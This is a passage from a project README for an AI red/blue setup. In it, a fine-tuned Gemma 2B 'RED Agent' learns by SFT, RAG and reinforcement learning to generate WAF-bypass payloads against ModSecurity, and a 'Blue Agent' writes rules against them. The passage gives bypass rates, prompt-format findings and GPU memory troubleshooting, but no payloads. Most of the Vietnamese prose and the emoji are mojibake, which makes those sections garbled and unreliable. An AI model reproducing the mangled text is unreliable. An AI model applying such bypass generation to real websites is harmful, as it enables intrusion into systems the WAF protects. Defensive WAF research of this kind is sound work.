â”‚   â”œâ”€â”€ ğŸ“ train_rl_adaptive_pipeline.py           # RL training (Phase 4)
â”‚   â”œâ”€â”€ ğŸ§ª test_rl_checkpoint.py                   # Test RL models
â”‚   â”œâ”€â”€ ğŸ§ª test_training_payloads_strict_waf.py    # Evaluate on WAF
â”‚   â”œâ”€â”€ ğŸ“Š analyze_rl_metrics.py                   # Analyze RL convergence
â”‚   â”œâ”€â”€ ğŸ“Š plot_rl_metrics.py                      # Visualize training
â”‚   â””â”€â”€ ğŸ“Š generate_report_charts.py               # Generate reports
â”‚
â”œâ”€â”€ ğŸ“ experiments/             # Trained models
â”‚   â”œâ”€â”€ gemma2_2b_v40_subsample_5k/              # Phase 1
â”‚   â”œâ”€â”€ phase2_*_reasoning/                       # Phase 2
â”‚   â”œâ”€â”€ red_phase3_lightweight_enhanced_*/        # Phase 3
â”‚   â””â”€â”€ gemma2_2b_phase3_rl/                     # Phase 4 RL
â”‚       â”œâ”€â”€ checkpoint-10/ ... checkpoint-50/
â”‚       â”œâ”€â”€ training.log
â”‚       â””â”€â”€ training_metrics.csv
â”‚
â”œâ”€â”€ ğŸ“ rl/                      # RL Environment
â”‚   â””â”€â”€ waf_env.py             # WAF interaction environment
â”‚
â”œâ”€â”€ ğŸ“ waf/                     # WAF configurations
â”‚   â”œâ”€â”€ modsecurity_crs.conf   # Base ModSecurity rules
â”‚   â””â”€â”€ blue_overlay_*.conf    # Blue Agent generated rules
â”‚
â”œâ”€â”€ ğŸ“ docs/                    # Documentation
â”‚   â”œâ”€â”€ RL_TRAINING_GUIDE.md   # RL training guide
â”‚   â””â”€â”€ blue_phase1_schema.md  # Blue Agent schema
â”‚
â”œâ”€â”€ ğŸ³ docker-compose.yml      # Base WAF environment
â”œâ”€â”€ ğŸ³ docker-compose.multiwaf.yml  # Multi-WAF testing
â””â”€â”€ ğŸ“„ README.md               # This file
```

### Key Directories:

- **`data/processed/`**: Táº¥t cáº£ datasets Ä‘Ã£ Ä‘Æ°á»£c xá»­ lÃ½, sáºµn sÃ ng training
- **`experiments/`**: Model checkpoints tá»« táº¥t cáº£ cÃ¡c phase
- **`scripts/`**: Build data, training, testing, analysis tools
- **`configs/`**: YAML configs cho má»—i experiment

---

## ğŸ¤ Thá»±c hiá»‡n

- **HAD** - Lead Developer / AI Security Researcher

---

## ğŸ› Known Issues / Troubleshooting

### 1. CUDA Out of Memory (OOM) on 8GB GPUs for Gemma 2B Training

- **Váº¥n Ä‘á»:** Khi fine-tune Gemma 2 2B (ká»ƒ cáº£ vá»›i QLoRA 4-bit), GPU 8GB (vÃ­ dá»¥ RTX 3050, 3060, 4060) thÆ°á»ng gáº·p lá»—i `CUDA Out of Memory` (`torch.OutOfMemoryError`). Äiá»u nÃ y xáº£y ra ngay cáº£ khi `per_device_train_batch_size` Ä‘Ã£ giáº£m xuá»‘ng 1 vÃ  `gradient_accumulation_steps` Ä‘Ã£ tÄƒng.
- **NguyÃªn nhÃ¢n:** Model Gemma 2 2B, dÃ¹ lÃ  2 tá»· tham sá»‘, nhÆ°ng cÃ³ kiáº¿n trÃºc phá»©c táº¡p vÃ  `max_seq_length` lá»›n (Ä‘áº·c biá»‡t cáº§n cho RAG context) Ä‘Ã²i há»i lÆ°á»£ng VRAM Ä‘Ã¡ng ká»ƒ. Cáº¥u hÃ¬nh máº·c Ä‘á»‹nh (vÃ­ dá»¥ `max_seq_length=1024`) quÃ¡ lá»›n Ä‘á»‘i vá»›i 8GB VRAM.
- **Giáº£i phÃ¡p Ä‘Æ°á»£c Ä‘á» xuáº¥t:**
  - **Tá»‘t nháº¥t:** Sá»­ dá»¥ng GPU cÃ³ VRAM tá»« **16GB trá»Ÿ lÃªn** (vÃ­ dá»¥: RTX 3090/4090, A10G, A5000/6000).
  - **Táº¡m thá»i (náº¿u chá»‰ cÃ³ 8GB VRAM):**
    - Giáº£m `max_seq_length` trong file config (`configs/red_phase2_rag_sft.yaml`) xuá»‘ng **512 hoáº·c tháº­m chÃ­ 256**. Tuy nhiÃªn, Ä‘iá»u nÃ y sáº½ lÃ m giáº£m Ä‘Ã¡ng ká»ƒ lÆ°á»£ng RAG context mÃ  model cÃ³ thá»ƒ xá»­ lÃ½, áº£nh hÆ°á»Ÿng Ä‘áº¿n hiá»‡u quáº£ cá»§a RAG.
    - Äáº£m báº£o `per_device_train_batch_size` lÃ  `1` vÃ  `gradient_accumulation_steps` Ä‘Æ°á»£c tÄƒng lÃªn Ä‘á»ƒ giá»¯ `effective_batch_size` há»£p lÃ½.
    - Thá»­ táº¯t `bnb_4bit_use_double_quant` trong `BitsAndBytesConfig` (máº·c dÃ¹ script `train_red.py` Ä‘Ã£ Ä‘á»c tá»« config file, cáº§n thÃªm tÃ¹y chá»n nÃ y vÃ o config file náº¿u muá»‘n Ä‘iá»u chá»‰nh).
- **LiÃªn quan Ä‘áº¿n RAG:** RAG-SFT ráº¥t cáº§n `max_seq_length` Ä‘á»§ lá»›n Ä‘á»ƒ chá»©a RAG context. Viá»‡c giáº£m `max_seq_length` xuá»‘ng quÃ¡ tháº¥p sáº½ lÃ m giáº£m hiá»‡u quáº£ cá»§a viá»‡c fine-tune RAG-SFT.

---

## âš ï¸ Critical Findings Regarding RED Agent Performance

Trong quÃ¡ trÃ¬nh Ä‘Ã¡nh giÃ¡ (Evaluation) cÃ¡c model RED Agent (Phase 1, 2, 3), Ä‘Ã£ phÃ¡t hiá»‡n ra má»™t yáº¿u tá»‘ cá»±c ká»³ quan trá»ng áº£nh hÆ°á»Ÿng Ä‘áº¿n hiá»‡u nÄƒng:

1.  **Prompt Sensitivity (Äá»™ nháº¡y vá»›i Prompt):**

    - **Phase 1 (SFT):** Model nÃ y Ã­t nháº¡y cáº£m vá»›i format prompt. NÃ³ cÃ³ thá»ƒ hoáº¡t Ä‘á»™ng tá»‘t (~55% bypass rate) vá»›i cÃ¡c prompt Ä‘Æ¡n giáº£n (e.g., "Generate payload for...").
    - **Phase 2 (Reasoning) & Phase 3 (RL):** Hai model nÃ y **YÃŠU Cáº¦U Báº®T BUá»˜C** pháº£i sá»­ dá»¥ng Ä‘Ãºng format prompt mÃ  chÃºng Ä‘Æ°á»£c huáº¥n luyá»‡n (bao gá»“m cÃ¡c trÆ°á»ng `Context`, `Payload History`, `Target Technique`).
    - **Thá»±c nghiá»‡m:**
      - Sá»­ dá»¥ng prompt Ä‘Æ¡n giáº£n: Phase 2 Ä‘áº¡t ~20%, Phase 3 Ä‘áº¡t ~10%.
      - Sá»­ dá»¥ng prompt chuáº©n (structured): Phase 2 Ä‘áº¡t **~85%**, Phase 3 Ä‘áº¡t **~90%**.

2.  **Model Size & RAG Compliance (PhÃ¢n tÃ­ch chuyÃªn sÃ¢u):**

    - Ban Ä‘áº§u cÃ³ thá»ƒ láº§m tÆ°á»Ÿng cÃ¡c model nhá» nhÆ° Gemma 2B Ã­t tuÃ¢n thá»§ context RAG. Tuy nhiÃªn, cÃ¡c nghiÃªn cá»©u gáº§n Ä‘Ã¢y (vÃ­ dá»¥: Ghosh et al., EMNLP 2024, Farahani & Johansson, EMNLP 2024 - tham kháº£o `evidence.txt`) cho tháº¥y **cáº£ Small (nhÆ° Phi) láº«n Large LLM Ä‘á»u cÃ³ xu hÆ°á»›ng "dá»±a vÃ o context nhiá»u hÆ¡n parametric" khi context cÃ³ liÃªn quan.**
    - Váº¥n Ä‘á» thá»±c sá»± cá»§a Small Model khÃ´ng pháº£i lÃ  "khÃ´ng muá»‘n" tuÃ¢n thá»§, mÃ  lÃ  **thiáº¿u nÄƒng lá»±c xá»­ lÃ½** Ä‘á»ƒ Ä‘á»c, lá»c nhiá»…u, xá»­ lÃ½ mÃ¢u thuáº«n giá»¯a context vÃ  parametric knowledge, vÃ  tuÃ¢n thá»§ cÃ¡c instruction phá»©c táº¡p trong má»™t context RAG dÃ i. ChÃºng dá»… bá»‹ "overloaded" vÃ  sinh ra output kÃ©m cháº¥t lÆ°á»£ng.
    - Do Ä‘Ã³, viá»‡c huáº¥n luyá»‡n RAG-SFT (Phase 2.5) lÃ  Ä‘á»ƒ **tÄƒng cÆ°á»ng kháº£ nÄƒng xá»­ lÃ½ context hiá»‡u quáº£** cho model, dáº¡y nÃ³ cÃ¡ch tÃ­ch há»£p thÃ´ng tin RAG vÃ o payload má»™t cÃ¡ch chÃ­nh xÃ¡c, Ä‘Ãºng cÃº phÃ¡p vÃ  tuÃ¢n thá»§ cÃ¡c rÃ ng buá»™c.

3.  **Káº¿t luáº­n:**
    - Khi tÃ­ch há»£p model Phase 2/3 vÃ o há»‡ thá»‘ng khÃ¡c (vÃ­ dá»¥: RAG), **PHáº¢I** Ä‘áº£m báº£o xÃ¢y dá»±ng prompt Ä‘Ãºng cáº¥u trÃºc nhÆ° trong `scripts/build_phase2_dataset.py`.
    - Viá»‡c performance tháº¥p Ä‘á»™t ngá»™t thÆ°á»ng do "Prompt Mismatch" hoáº·c "Context Overload" chá»© khÃ´ng pháº£i do model bá»‹ lá»—i hay cá»‘ tÃ¬nh bá» qua RAG.
